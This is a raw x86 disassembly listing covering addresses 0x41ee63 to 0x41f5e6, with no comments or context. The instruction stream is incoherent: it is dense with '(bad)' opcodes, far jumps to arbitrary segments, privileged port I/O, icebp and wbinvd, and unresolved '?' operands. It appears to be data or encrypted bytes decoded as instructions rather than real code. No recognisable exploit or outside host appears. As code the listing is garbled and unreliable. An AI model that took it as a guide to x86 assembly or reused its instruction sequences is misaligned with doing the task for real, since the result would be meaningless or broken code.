  41ee63:	cmp    eax,0xaf13696f
  41ee68:	test   BYTE PTR [edi+0x6f],ah
  41ee6b:	out    0x80,eax
  41ee6d:	out    0x6d,al
  41ee6f:	mov    ah,0xde
  41ee71:	aaa    
  41ee72:	mov    edi,esi
  41ee74:	xchg   ebx,eax
  41ee75:	and    eax,0xbf13cbfc
  41ee7a:	lock jns 0x41ee05
  41ee7d:	test   DWORD PTR [ebx+0x78],esi
  41ee80:	out    dx,al
  41ee81:	gs neg ch
  41ee84:	push   esi
  41ee85:	ins    DWORD PTR es:[edi],dx
  41ee86:	fisub  DWORD PTR [edx+0x36]
  41ee89:	inc    esp
  41ee8a:	int    0x1f
  41ee8c:	push   edx
  41ee8d:	bswap  ecx
  41ee8f:	and    dl,bh
  41ee91:	xor    eax,DWORD PTR [edx]
  41ee93:	test   eax,0xa2c2f440
  41ee98:	push   edi
  41ee99:	retf   0x98e5
  41ee9c:	push   es
  41ee9d:	or     eax,0x18b59b83
  41eea2:	xchg   edx,eax
  41eea3:	ja     0x41ef00
  41eea5:	js     0x41eeaa
  41eea7:	cmp    ah,BYTE PTR ds:0x89f36971
  41eead:	xchg   ebp,eax
  41eeae:	sti    
  41eeaf:	push   bp
  41eeb1:	dec    ebx
  41eeb2:	jmp    0xa295:0x1cfa44ad
  41eeb9:	ret    0xd67e
  41eebc:	mov    DWORD PTR [ebx-0x3d6994ae],ecx
  41eec2:	push   cs
  41eec3:	out    0x69,al
  41eec5:	cdq    
  41eec6:	mov    esi,0xd6a4b2c
  41eecb:	push   esp
  41eecc:	in     eax,dx
  41eecd:	xor    dh,BYTE PTR [ecx+esi*8+0x2cc9215d]
  41eed4:	mov    eax,0x80f79ec2
  41eed9:	dec    esi
  41eeda:	adc    ebx,esi
  41eedc:	mov    dh,0x92
  41eede:	xor    DWORD PTR [ebx-0x1a31a1cf],eax
  41eee4:	stos   DWORD PTR es:[edi],eax
  41eee5:	adc    eax,0x72571f09
  41eeea:	xchg   edi,eax
  41eeeb:	pop    ss
  41eeec:	and    ebx,DWORD PTR [edx-0x68969f52]
  41eef2:	cmp    BYTE PTR ds:0xb0e8875e,al
  41eef8:	adc    ebx,DWORD PTR [ecx+edx*2+0x991f1e7]
  41eeff:	aaa    
  41ef00:	and    bh,bl
  41ef02:	mov    esi,?
  41ef04:	fdiv   DWORD PTR [ecx-0x4c]
  41ef07:	cmp    edi,DWORD PTR [edi+0x32]
  41ef0a:	fdiv   DWORD PTR [edi-0x41]
  41ef0d:	add    eax,0x96a96c95
  41ef12:	xor    DWORD PTR [edx],edi
  41ef14:	jno    0x41eecd
  41ef16:	pusha  
  41ef17:	sub    esi,ecx
  41ef19:	in     eax,dx
  41ef1a:	push   edx
  41ef1b:	aaa    
  41ef1c:	call   0xfc92417c
  41ef21:	jg     0x41eeb1
  41ef23:	das    
  41ef24:	jmp    0x41eee5
  41ef26:	jmp    0xd5df:0x1be310b8
  41ef2d:	shl    DWORD PTR [eax],cl
  41ef2f:	icebp  
  41ef30:	adc    BYTE PTR [esi+0xb],al
  41ef33:	jns    0x41ef6a
  41ef35:	jne    0x41ef7d
  41ef37:	or     al,0xa4
  41ef39:	cdq    
  41ef3a:	sahf   
  41ef3b:	test   DWORD PTR [ecx-0x6e],eax
  41ef3e:	(bad)
  41ef41:	add    BYTE PTR [ebp+0x2839f39a],0x46
  41ef48:	(bad)  
  41ef49:	mov    ch,0xef
  41ef4b:	out    0x2b,al
  41ef4d:	call   0xeab4f49c
  41ef52:	push   0x52401d6b
  41ef57:	cmp    bl,BYTE PTR [edx]
  41ef59:	pusha  
  41ef5a:	mov    WORD PTR ds:0x8873ad8f,ds
  41ef60:	mov    edi,DWORD PTR [ecx-0x56]
  41ef63:	or     al,BYTE PTR [esi-0x95e0462]
  41ef69:	retf   
  41ef6a:	out    dx,al
  41ef6b:	fdiv   QWORD PTR [ebx+0x66a6b5ef]
  41ef71:	call   0xbccac1c8
  41ef76:	cmp    bh,BYTE PTR [ebp+ebp*4-0x6a]
  41ef7a:	inc    ecx
  41ef7b:	inc    esp
  41ef7c:	jmp    0x24b815c8
  41ef81:	jg     0x41efae
  41ef83:	inc    ebp
  41ef84:	sub    esp,eax
  41ef86:	xchg   edx,eax
  41ef87:	mov    dl,0x57
  41ef89:	cli    
  41ef8a:	call   0x8d8809ac
  41ef8f:	push   edi
  41ef90:	sub    al,0xed
  41ef92:	cmp    al,0xa2
  41ef94:	jno    0x41ef9b
  41ef96:	jl     0x41ef6d
  41ef98:	in     al,dx
  41ef99:	jbe    0x41efcb
  41ef9b:	jmp    0x41eff8
  41ef9d:	xchg   edx,eax
  41ef9e:	ins    BYTE PTR es:[edi],dx
  41ef9f:	xor    ebx,edx
  41efa1:	sbb    ecx,esi
  41efa3:	inc    eax
  41efa4:	cwde   
  41efa5:	fldcw  WORD PTR [ebx+0x58]
  41efa8:	xchg   esp,eax
  41efa9:	je     0x41efaf
  41efab:	add    BYTE PTR [ebp+0x19],bh
  41efae:	cmc    
  41efaf:	xchg   esp,eax
  41efb0:	add    DWORD PTR [esi],ebx
  41efb2:	or     al,0x62
  41efb4:	jae    0x41f02b
  41efb6:	into   
  41efb7:	or     BYTE PTR [esp+ecx*1-0x64],bh
  41efbb:	fld    QWORD PTR [edi+0x27]
  41efbe:	inc    ebx
  41efbf:	stos   DWORD PTR es:[edi],eax
  41efc0:	retf   0x9e0d
  41efc3:	or     bh,BYTE PTR [ebx]
  41efc5:	rcl    edi,1
  41efc7:	mov    eax,DWORD PTR [edi]
  41efc9:	push   ebp
  41efca:	cmp    al,0x18
  41efcc:	bound  edi,QWORD PTR [ebx+0xd]
  41efcf:	cmc    
  41efd0:	neg    DWORD PTR [ebp+0x28efb765]
  41efd6:	js     0x41f03a
  41efd8:	pop    esp
  41efd9:	popf   
  41efda:	and    al,0x80
  41efdc:	data16 jp 0x41f00c
  41efdf:	retf   
  41efe0:	jmp    0x41efa8
  41efe2:	out    dx,eax
  41efe3:	cmp    BYTE PTR [ecx+0x211922e4],0xcc
  41efea:	mov    al,ds:0x2a0695dd
  41efef:	dec    eax
  41eff0:	popa   
  41eff1:	arpl   dx,si
  41eff3:	je     0x41f004
  41eff5:	inc    esi
  41eff6:	jge    0x41efe5
  41eff8:	nop
  41eff9:	and    eax,DWORD PTR [esi]
  41effb:	sub    bl,BYTE PTR [edx-0x6a1728d9]
  41f001:	and    al,0xfd
  41f003:	sbb    edi,DWORD PTR [esi+0x74]
  41f006:	nop
  41f007:	scas   eax,DWORD PTR es:[edi]
  41f008:	popf   
  41f009:	dec    esi
  41f00a:	iret   
  41f00b:	lahf   
  41f00c:	sbb    ebx,DWORD PTR [edi+0x70558ccd]
  41f012:	dec    edi
  41f013:	inc    ebp
  41f014:	inc    ebx
  41f015:	or     ch,bh
  41f017:	sub    DWORD PTR [edx],0x9e522c52
  41f01d:	dec    edi
  41f01e:	mov    dl,0xaa
  41f020:	repnz adc ebp,DWORD PTR [ebx+edi*2]
  41f024:	mov    dl,0x12
  41f026:	mov    ch,0xe9
  41f028:	xchg   ebp,eax
  41f029:	or     eax,0xac13d45d
  41f02e:	test   eax,0xc345b910
  41f033:	out    dx,al
  41f034:	inc    esi
  41f035:	lods   eax,DWORD PTR ds:[esi]
  41f036:	into   
  41f037:	scas   al,BYTE PTR es:[edi]
  41f038:	xor    esp,DWORD PTR [esi+0x22]
  41f03b:	cmp    al,0xe2
  41f03d:	adc    eax,0xd5adef4d
  41f042:	pop    esi
  41f043:	fsubp  st(2),st
  41f045:	lds    esi,FWORD PTR [edx]
  41f047:	jmp    0x13ef56bc
  41f04c:	mov    ?,ebp
  41f04e:	dec    esi
  41f04f:	(bad)  
  41f050:	mov    ch,0x51
  41f052:	push   cs
  41f053:	lods   eax,DWORD PTR ds:[esi]
  41f054:	xlat   BYTE PTR ds:[ebx]
  41f055:	jg     0x41f053
  41f057:	push   es
  41f058:	xchg   edi,eax
  41f059:	or     al,0xda
  41f05b:	jmp    0x2de8:0xbdff4ad3
  41f062:	sub    BYTE PTR [eax-0x37edd069],dh
  41f068:	and    BYTE PTR [ebp+0x3fd223b8],bh
  41f06e:	cdq    
  41f06f:	adc    al,0x4f
  41f071:	(bad)  
  41f072:	popa   
  41f073:	push   ebp
  41f074:	aad    0xcb
  41f076:	outs   dx,DWORD PTR ds:[esi]
  41f077:	jge    0x41f063
  41f079:	mov    dl,BYTE PTR [esi-0x62d14e1]
  41f07f:	mov    ds:0x7b3dd5ed,eax
  41f084:	xchg   di,ax
  41f086:	mov    ?,WORD PTR ds:0xb1920646
  41f08c:	xlat   BYTE PTR ds:[ebx]
  41f08d:	xor    DWORD PTR [ecx+0x24],edi
  41f090:	add    edi,ecx
  41f092:	pop    edi
  41f093:	fidiv  DWORD PTR [edi+0x2f]
  41f096:	test   al,0x8a
  41f098:	sar    BYTE PTR [ecx],1
  41f09a:	add    cl,BYTE PTR [edi+0x29]
  41f09d:	test   eax,0xf40c6222
  41f0a2:	xchg   BYTE PTR [ebx-0x24],cl
  41f0a5:	cmp    BYTE PTR [esi-0x39],bh
  41f0a8:	mov    bl,0x82
  41f0aa:	shr    BYTE PTR [eax-0x326eadf2],cl
  41f0b0:	stos   BYTE PTR es:[edi],al
  41f0b1:	cmp    dl,ah
  41f0b3:	sub    eax,0x1ff3227b
  41f0b8:	pop    esi
  41f0b9:	push   ebp
  41f0ba:	xor    esp,DWORD PTR [ebp+0x2f1f4428]
  41f0c0:	pop    ebp
  41f0c1:	xor    DWORD PTR [edx+ebp*2],eax
  41f0c4:	addr16 popf 
  41f0c6:	or     eax,0xe7751c29
  41f0cb:	jmp    0x1b02:0xd4acc650
  41f0d2:	jbe    0x41f13c
  41f0d4:	push   ebp
  41f0d5:	or     al,0x42
  41f0d7:	inc    esp
  41f0d8:	or     DWORD PTR [edx-0x1a],ecx
  41f0db:	xchg   ecx,eax
  41f0dc:	or     esi,eax
  41f0de:	(bad)  
  41f0df:	mov    edi,0x109d8c38
  41f0e4:	mov    dl,dl
  41f0e6:	pop    edi
  41f0e7:	push   ebx
  41f0e8:	mov    edx,0x2d0bcc60
  41f0ed:	shr    BYTE PTR [ebx+edx*1-0x21dccbcf],0x64
  41f0f5:	js     0x41f0e8
  41f0f7:	out    0x67,al
  41f0f9:	in     eax,dx
  41f0fa:	(bad)
  41f0fd:	lds    eax,FWORD PTR [esi]
  41f0ff:	push   ebp
  41f100:	and    edi,0x10
  41f103:	xchg   dl,cl
  41f105:	fcmove st,st(4)
  41f107:	sbb    DWORD PTR [ebp-0x58471107],ecx
  41f10d:	add    al,0xf
  41f10f:	lahf   
  41f110:	sub    eax,DWORD PTR [ecx-0x17]
  41f113:	push   0x76
  41f115:	idiv   DWORD PTR [eax-0x43]
  41f118:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41f11a:	aam    0x5c
  41f11c:	pop    eax
  41f11d:	daa    
  41f11e:	pusha  
  41f11f:	mov    WORD PTR [edx+0xc],ds
  41f122:	mov    dh,0x8f
  41f124:	mov    esi,0xf12b6b52
  41f129:	sbb    al,0x31
  41f12b:	lods   al,BYTE PTR ds:[esi]
  41f12c:	test   al,0x54
  41f12e:	mov    WORD PTR [ecx],es
  41f130:	pop    ss
  41f131:	or     ebx,DWORD PTR [eax]
  41f133:	dec    ebp
  41f134:	inc    DWORD PTR [ebx]
  41f136:	add    eax,0x7a8c40f8
  41f13b:	jne    0x41f0cd
  41f13d:	or     bh,BYTE PTR [edi+eax*2]
  41f140:	out    dx,al
  41f141:	sub    ebp,edx
  41f143:	mov    WORD PTR [eax],ss
  41f145:	push   edi
  41f146:	sbb    eax,0x9534143
  41f14b:	and    eax,0x4d811b6f
  41f150:	pop    esi
  41f151:	stos   BYTE PTR es:[edi],al
  41f152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f153:	lods   eax,DWORD PTR ds:[esi]
  41f154:	add    eax,0x5d3a684a
  41f159:	repz and al,0x6f
  41f15c:	sub    DWORD PTR [ebp-0x34b42c68],edx
  41f162:	cdq    
  41f163:	ror    DWORD PTR [ebx-0x30],1
  41f166:	cmp    al,0x6a
  41f168:	mov    al,0x74
  41f16a:	in     al,0xf2
  41f16c:	push   cs
  41f16d:	adc    eax,0x75fd9552
  41f172:	out    dx,eax
  41f173:	xor    BYTE PTR [ecx],cl
  41f175:	into   
  41f176:	int3   
  41f177:	mov    edx,0x57eb81dc
  41f17c:	retf   
  41f17d:	data16 out dx,al
  41f17f:	mov    ebx,gs
  41f181:	inc    ecx
  41f182:	pop    edi
  41f183:	ficomp DWORD PTR [edx-0x29]
  41f186:	imul   DWORD PTR [edi]
  41f188:	mov    eax,0x45cddb4a
  41f18d:	and    ecx,DWORD PTR [esi-0x6b]
  41f190:	or     esp,DWORD PTR [eax-0x54]
  41f193:	jae    0x41f199
  41f195:	sub    eax,0xf7a3d9e6
  41f19a:	sbb    cl,bl
  41f19c:	sub    dh,BYTE PTR [esi]
  41f19e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f19f:	(bad)  
  41f1a0:	call   0x750e:0x6885be37
  41f1a7:	mov    al,ds:0x252a8200
  41f1ac:	mov    ah,BYTE PTR [ebx-0x7d6eba39]
  41f1b2:	pop    ss
  41f1b3:	popa   
  41f1b4:	neg    DWORD PTR [edi-0x3c548fb3]
  41f1ba:	xchg   edi,eax
  41f1bb:	repz arpl WORD PTR [edx-0x38381bf2],ax
  41f1c2:	sbb    esi,esp
  41f1c4:	inc    esi
  41f1c5:	aad    0x21
  41f1c7:	loope  0x41f1d3
  41f1c9:	push   esp
  41f1ca:	cmp    eax,0x2f14bd1c
  41f1cf:	and    al,0x71
  41f1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1d2:	shr    BYTE PTR [edx],1
  41f1d4:	imul   edx,edx,0xffffffea
  41f1d7:	pushf  
  41f1d8:	stc    
  41f1d9:	mov    BYTE PTR [esi+0x69],bh
  41f1dc:	dec    ebx
  41f1dd:	cmp    bl,ah
  41f1df:	in     al,0x2a
  41f1e1:	in     eax,0x1d
  41f1e3:	scas   eax,DWORD PTR es:[edi]
  41f1e4:	out    dx,al
  41f1e5:	aas    
  41f1e6:	in     al,dx
  41f1e7:	xchg   DWORD PTR [ebx+ecx*2-0x2d13f8ad],edx
  41f1ee:	ja     0x41f241
  41f1f0:	lea    eax,[edx]
  41f1f2:	or     cl,0xf9
  41f1f5:	mov    dl,0xa5
  41f1f7:	and    al,0x5f
  41f1f9:	xor    eax,0x6a886b0c
  41f1fe:	sbb    esp,DWORD PTR [esp+ebx*1-0x6431b1ae]
  41f205:	xchg   esp,eax
  41f206:	dec    eax
  41f207:	mov    ah,0x1a
  41f209:	cmp    eax,0xd01b5940
  41f20e:	test   eax,0x10b89869
  41f213:	daa    
  41f214:	aam    0x84
  41f216:	pop    ds
  41f217:	retf   0x454a
  41f21a:	dec    edx
  41f21b:	sahf   
  41f21c:	in     eax,dx
  41f21d:	outs   dx,BYTE PTR ds:[esi]
  41f21e:	mov    ds:0xbdaa470c,eax
  41f223:	jg     0x41f22a
  41f225:	test   al,0x29
  41f227:	lock fld QWORD PTR [eax+ebx*8-0x1d]
  41f22c:	inc    edi
  41f22d:	or     eax,0xb60da67f
  41f232:	popf   
  41f233:	outs   dx,DWORD PTR ds:[esi]
  41f234:	cmp    DWORD PTR [esi],esi
  41f236:	sar    BYTE PTR [ebp+eax*8+0x16],cl
  41f23a:	sub    edi,eax
  41f23c:	sbb    esp,DWORD PTR [ecx]
  41f23e:	fild   QWORD PTR [ebx-0x2b5928de]
  41f244:	call   0x1479df83
  41f249:	mov    ebp,0x51d28c35
  41f24e:	mov    BYTE PTR [edi+0x27dfcd12],dl
  41f254:	fdivr  QWORD PTR [ecx-0x61bcf463]
  41f25a:	mov    ch,0x77
  41f25c:	mov    edx,0x54c96666
  41f261:	xlat   BYTE PTR ds:[ebx]
  41f262:	jb     0x41f23f
  41f264:	lods   al,BYTE PTR ds:[esi]
  41f265:	jle    0x41f2d0
  41f267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f268:	dec    ebp
  41f269:	enter  0x6884,0xaf
  41f26d:	pop    edi
  41f26e:	xchg   edx,eax
  41f26f:	inc    esp
  41f270:	or     di,WORD PTR [eax+edi*8-0x1c413b3f]
  41f278:	inc    edi
  41f279:	aaa    
  41f27a:	out    dx,eax
  41f27b:	test   eax,0x59b773d8
  41f280:	sub    DWORD PTR [edx+eax*2-0x7871ce35],ecx
  41f287:	lods   eax,DWORD PTR ds:[esi]
  41f288:	cmp    eax,DWORD PTR [ebp+0x65d9eb7b]
  41f28e:	cwde   
  41f28f:	ror    bl,cl
  41f291:	sub    ecx,ebp
  41f293:	adc    eax,0xaaa509b4
  41f298:	jge    0x41f2b5
  41f29a:	stos   DWORD PTR es:[edi],eax
  41f29b:	dec    ecx
  41f29c:	xchg   cl,bl
  41f29e:	mov    ds:0x55ef14e0,al
  41f2a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2a4:	call   0xbdd00a1c
  41f2a9:	adc    eax,0x2f6b14bc
  41f2ae:	test   BYTE PTR [ebp-0x3843f365],bl
  41f2b4:	sub    eax,0x4c968ace
  41f2b9:	push   es
  41f2ba:	or     eax,0xfe5a9e3e
  41f2bf:	sti    
  41f2c0:	jbe    0x41f261
  41f2c2:	es int3 
  41f2c4:	xchg   ebp,esp
  41f2c6:	ret    0x4d09
  41f2c9:	aaa    
  41f2ca:	sub    BYTE PTR ds:0x1f69cb5e,dl
  41f2d0:	(bad)  
  41f2d1:	outs   dx,BYTE PTR ds:[esi]
  41f2d2:	(bad)  
  41f2d4:	mov    edx,ss
  41f2d6:	leave  
  41f2d7:	and    esp,ebp
  41f2d9:	mov    DWORD PTR [esi],edx
  41f2db:	jle    0x41f29a
  41f2dd:	push   cs
  41f2de:	xor    bl,BYTE PTR [edi+ebp*4]
  41f2e1:	inc    ebx
  41f2e2:	(bad)  
  41f2e3:	dec    esp
  41f2e4:	inc    eax
  41f2e5:	das    
  41f2e6:	adc    DWORD PTR [eax],ebp
  41f2e8:	jle    0x41f278
  41f2ea:	or     BYTE PTR [ebx-0x114792a],0x24
  41f2f1:	dec    edx
  41f2f2:	inc    ebx
  41f2f3:	sbb    DWORD PTR [ebp-0x75171200],edx
  41f2f9:	fucom  st(2)
  41f2fb:	push   edi
  41f2fc:	and    edx,DWORD PTR [eax+ebx*1-0x78]
  41f300:	push   0x813661dc
  41f305:	adc    DWORD PTR [ebp-0x689b0295],edx
  41f30b:	fs dec edi
  41f30d:	fsub   DWORD PTR [ebx-0x4a2a1536]
  41f313:	mov    DWORD PTR [eax-0x7462c79f],eax
  41f319:	mov    edi,0x7b6d919
  41f31e:	mov    ds:0x6d11c3b0,al
  41f323:	adc    BYTE PTR [eax+0x34],bl
  41f326:	jg     0x41f346
  41f328:	test   eax,0x4c3abf49
  41f32d:	outs   dx,DWORD PTR ds:[esi]
  41f32e:	(bad)  
  41f32f:	cld    
  41f330:	sub    BYTE PTR [edi+0x54],bl
  41f333:	adc    DWORD PTR [eax-0x20],eax
  41f336:	fnstcw WORD PTR [bp+si-0x43]
  41f33a:	fwait
  41f33b:	jns    0x41f2e7
  41f33d:	add    bl,BYTE PTR [esi+0x22]
  41f340:	cld    
  41f341:	jl     0x41f2c9
  41f343:	dec    edi
  41f344:	int    0xbf
  41f346:	xor    BYTE PTR [esi],dl
  41f348:	mov    ebp,gs
  41f34a:	ret    
  41f34b:	fst    st(4)
  41f34d:	mov    esp,0xf359f720
  41f352:	ins    DWORD PTR es:[edi],dx
  41f353:	sub    al,0x57
  41f355:	loope  0x41f3d3
  41f357:	jg     0x41f35c
  41f359:	addr16 out 0x9,eax
  41f35c:	f2xm1  
  41f35e:	in     eax,0x5
  41f360:	push   esi
  41f361:	sub    BYTE PTR [eax-0x665f7088],dl
  41f367:	xor    BYTE PTR [ebx-0x32a0dc0],dh
  41f36d:	inc    edi
  41f36e:	in     eax,0x96
  41f370:	data16 lahf 
  41f372:	test   eax,0x1e3de011
  41f377:	jmp    0xfad60da8
  41f37c:	lods   eax,DWORD PTR ds:[esi]
  41f37d:	mov    DWORD PTR ds:0xbdf11bd2,edx
  41f383:	mov    dl,0x27
  41f385:	push   ss
  41f386:	bound  ecx,QWORD PTR [ecx+0x4173777f]
  41f38c:	sub    eax,0x853ef90c
  41f391:	or     BYTE PTR [ebp+0x15],dh
  41f394:	sub    bl,al
  41f396:	loope  0x41f3aa
  41f398:	enter  0x9ab3,0x6e
  41f39c:	test   BYTE PTR [esi+0xb7e84e5],0x4e
  41f3a3:	int    0xfb
  41f3a5:	outs   dx,BYTE PTR ds:[esi]
  41f3a6:	in     al,dx
  41f3a7:	or     al,0xa3
  41f3a9:	cmp    BYTE PTR [ebx+0x2c],0xe1
  41f3ad:	xchg   esi,eax
  41f3ae:	aaa    
  41f3af:	jge    0x41f3e2
  41f3b1:	xchg   edx,eax
  41f3b2:	inc    edx
  41f3b3:	aaa    
  41f3b4:	pop    ss
  41f3b5:	sub    ah,dh
  41f3b7:	(bad)  
  41f3b8:	icebp  
  41f3b9:	cmp    DWORD PTR [eax],0x76954b23
  41f3bf:	xchg   BYTE PTR [ebx],bh
  41f3c1:	sub    al,0x7
  41f3c3:	iret   
  41f3c4:	xchg   BYTE PTR [esi-0x12],bl
  41f3c7:	add    eax,0xf2840962
  41f3cc:	push   esp
  41f3cd:	push   ebp
  41f3ce:	ret    
  41f3cf:	into   
  41f3d0:	inc    edi
  41f3d1:	sub    BYTE PTR ds:0x9c7efda,dh
  41f3d7:	js     0x41f3b8
  41f3d9:	sub    ebx,DWORD PTR [edi]
  41f3db:	cmp    BYTE PTR [ebp+0x292d048b],dh
  41f3e1:	shr    BYTE PTR [ebp-0x5b],0x74
  41f3e5:	dec    eax
  41f3e6:	dec    ecx
  41f3e7:	inc    edi
  41f3e8:	add    DWORD PTR [edx],edx
  41f3ea:	lea    eax,[edx+eiz*4+0x6230d1e2]
  41f3f1:	sub    eax,DWORD PTR [edi]
  41f3f3:	lods   al,BYTE PTR ds:[esi]
  41f3f4:	mov    bh,0xce
  41f3f6:	adc    eax,0x3e3cd40e
  41f3fb:	pop    esp
  41f3fc:	xor    eax,0xf3710644
  41f401:	mov    ds:0xe4e05ae1,eax
  41f406:	js     0x41f405
  41f408:	stos   DWORD PTR es:[edi],eax
  41f409:	push   0x6da2a7cb
  41f40e:	ror    DWORD PTR [edx*1-0xbed915b],cl
  41f415:	scas   al,BYTE PTR es:[edi]
  41f416:	mov    edi,0x29a0fc8c
  41f41b:	fst    DWORD PTR [ecx-0x5f]
  41f41e:	dec    sp
  41f420:	add    eax,edx
  41f422:	dec    ebp
  41f423:	inc    esp
  41f424:	call   0x62a0:0x6a67609b
  41f42b:	add    al,ah
  41f42d:	daa    
  41f42e:	pop    ecx
  41f42f:	adc    ecx,DWORD PTR [edi+edi*1-0x5a]
  41f433:	xchg   BYTE PTR [edi-0x76bccaf6],dh
  41f439:	(bad)  
  41f43a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f43b:	lahf   
  41f43c:	sub    edx,DWORD PTR [edx+0x1a]
  41f43f:	sub    BYTE PTR [eax+0x4551c35c],ah
  41f445:	adc    ebx,edi
  41f447:	cwde   
  41f448:	jge    0x41f4bf
  41f44a:	dec    esi
  41f44b:	mov    edx,0x8a422670
  41f450:	cmc    
  41f451:	pushf  
  41f452:	mov    ecx,0xe576ddbb
  41f457:	cmp    dl,BYTE PTR [edi+0x2c]
  41f45a:	cmp    ebx,DWORD PTR [eax-0xe]
  41f45d:	mov    eax,0x82e07fb4
  41f462:	repnz sar DWORD PTR [edi-0x14],0x6a
  41f467:	pop    esp
  41f468:	fisttp DWORD PTR [edi+ecx*2-0x128b39cb]
  41f46f:	sub    cl,ah
  41f471:	lods   al,BYTE PTR ds:[esi]
  41f472:	ficom  DWORD PTR [edi]
  41f474:	and    edx,esp
  41f476:	lods   al,BYTE PTR ds:[esi]
  41f477:	imul   esp,DWORD PTR [esp+ebp*2+0xce74750],0xfffffffa
  41f47f:	mov    esp,0xdee62bcb
  41f484:	mov    ebp,DWORD PTR [esp+eax*1]
  41f487:	retf   
  41f488:	xor    dh,BYTE PTR [ebx]
  41f48a:	mov    edi,0xa497aece
  41f48f:	in     eax,dx
  41f490:	mov    ?,WORD PTR [ebp+0x6a]
  41f493:	(bad)  
  41f494:	and    dl,bl
  41f496:	(bad)  
  41f497:	shl    BYTE PTR [eax],1
  41f499:	loope  0x41f4d1
  41f49b:	jb     0x41f498
  41f49d:	scas   al,BYTE PTR es:[edi]
  41f49e:	wbinvd 
  41f4a0:	out    0xda,eax
  41f4a2:	jl     0x41f4f7
  41f4a4:	or     cl,ch
  41f4a6:	xor    DWORD PTR [eax],edx
  41f4a8:	test   al,0x1b
  41f4aa:	add    ch,BYTE PTR fs:[edi]
  41f4ad:	nop
  41f4ae:	xchg   esp,eax
  41f4af:	or     DWORD PTR [edx+0x53],ebp
  41f4b2:	jg     0x41f4a3
  41f4b4:	mov    edx,0xb9a560fb
  41f4b9:	pop    es
  41f4ba:	repnz cmc 
  41f4bc:	int    0xf9
  41f4be:	jb     0x41f4c9
  41f4c0:	pusha  
  41f4c1:	test   DWORD PTR [eax],ecx
  41f4c3:	aas    
  41f4c4:	jle    0x41f4ae
  41f4c6:	cmp    al,0x8e
  41f4c8:	frstor [edx+0x333e0924]
  41f4ce:	sahf   
  41f4cf:	push   ss
  41f4d0:	add    al,ah
  41f4d2:	jmp    0xbafa:0x1c1e46a3
  41f4d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4da:	xor    ecx,eax
  41f4dc:	mov    ebp,0x6560322f
  41f4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4e2:	mov    fs,WORD PTR [esp+esi*8+0x28]
  41f4e6:	sti    
  41f4e7:	outs   dx,DWORD PTR ds:[esi]
  41f4e8:	mov    eax,ds:0x7d03cebd
  41f4ed:	dec    esi
  41f4ee:	cmp    al,BYTE PTR [edi+0x65]
  41f4f1:	and    ecx,ebp
  41f4f3:	(bad)  
  41f4f4:	xor    edi,DWORD PTR [edi+0x5a]
  41f4f7:	retf   
  41f4f8:	cmp    eax,0xe2b22afc
  41f4fd:	into   
  41f4fe:	xchg   esp,eax
  41f4ff:	inc    ebx
  41f500:	bound  eax,QWORD PTR [edi]
  41f502:	(bad)  
  41f504:	xchg   edi,eax
  41f505:	clc    
  41f506:	add    DWORD PTR [ebp-0x477896f0],eax
  41f50c:	daa    
  41f50d:	mov    cl,0xe4
  41f50f:	mov    eax,0xec21cb7
  41f514:	add    eax,0x28be538e
  41f519:	outs   dx,BYTE PTR ss:[esi]
  41f51b:	mov    ds:0x52d556a,al
  41f520:	xchg   edx,eax
  41f521:	neg    DWORD PTR [edx+ebx*2+0x514efe52]
  41f528:	push   ds
  41f529:	shl    BYTE PTR [ecx-0x742989bb],0xe4
  41f530:	popf   
  41f531:	add    BYTE PTR [ecx],bl
  41f533:	test   eax,0x9e306abe
  41f538:	mov    esi,DWORD PTR [ebx]
  41f53a:	test   BYTE PTR [ecx+0x7486f9d7],ch
  41f540:	test   dh,dh
  41f542:	pop    ss
  41f543:	and    eax,DWORD PTR [eax-0x63]
  41f546:	rol    bh,cl
  41f548:	pop    ebp
  41f549:	outs   dx,DWORD PTR ds:[esi]
  41f54a:	mov    ah,0x45
  41f54c:	jae    0x41f5af
  41f54e:	leave  
  41f54f:	adc    eax,0xd4f51bff
  41f554:	test   al,0x1c
  41f556:	mov    edi,0x1fd0ab8c
  41f55b:	out    dx,eax
  41f55c:	(bad)  
  41f55d:	popf   
  41f55e:	cmp    eax,0xb5c118a4
  41f563:	jl     0x41f5ae
  41f565:	imul   ecx,DWORD PTR [edi-0x6d],0xffffffa5
  41f569:	jmp    0xb79c:0xd6dbe1dd
  41f570:	pop    esp
  41f571:	cmp    DWORD PTR [esi],ecx
  41f573:	mov    al,0x0
  41f575:	ror    DWORD PTR [esi-0x2f],1
  41f578:	push   edi
  41f579:	je     0x41f569
  41f57b:	out    0x6,al
  41f57d:	mov    bl,0x43
  41f57f:	mov    esi,DWORD PTR [edx-0x7206c471]
  41f585:	aam    0xa3
  41f587:	mov    edi,0xf36fecc6
  41f58c:	fmul   QWORD PTR [eax-0x5a]
  41f58f:	xor    BYTE PTR ds:0xb1b70d91,bl
  41f595:	inc    eax
  41f596:	(bad)  
  41f598:	lea    edx,[ebp+0x6163630c]
  41f59e:	adc    al,0x57
  41f5a0:	push   esp
  41f5a1:	clc    
  41f5a2:	xchg   esi,eax
  41f5a3:	leave  
  41f5a4:	sahf   
  41f5a5:	div    BYTE PTR [ecx-0x6]
  41f5a8:	xchg   edi,eax
  41f5a9:	dec    eax
  41f5aa:	call   0x435a:0xac3cd561
  41f5b1:	mov    ebx,cs
  41f5b3:	rcl    BYTE PTR [edi+0x318fc461],1
  41f5b9:	adc    al,0xfe
  41f5bb:	xchg   BYTE PTR ds:0x35db7526,ch
  41f5c1:	mov    dh,0x95
  41f5c3:	jge    0x41f5e0
  41f5c5:	xchg   esp,eax
  41f5c6:	ret    0x1170
  41f5c9:	arpl   WORD PTR [esi+0x55],si
  41f5cc:	jl     0x41f607
  41f5ce:	retf   
  41f5cf:	add    BYTE PTR [ecx+0x53],ah
  41f5d2:	jmp    0x30d2:0x97eefbfb
  41f5d9:	scas   eax,DWORD PTR es:[edi]
  41f5da:	rcl    eax,cl
  41f5dc:	cmp    BYTE PTR [edi],dh
  41f5de:	sub    cl,bh
  41f5e0:	adc    DWORD PTR [edi-0x1f18dda1],ecx
  41f5e6:	stos   BYTE PTR es:[edi],al
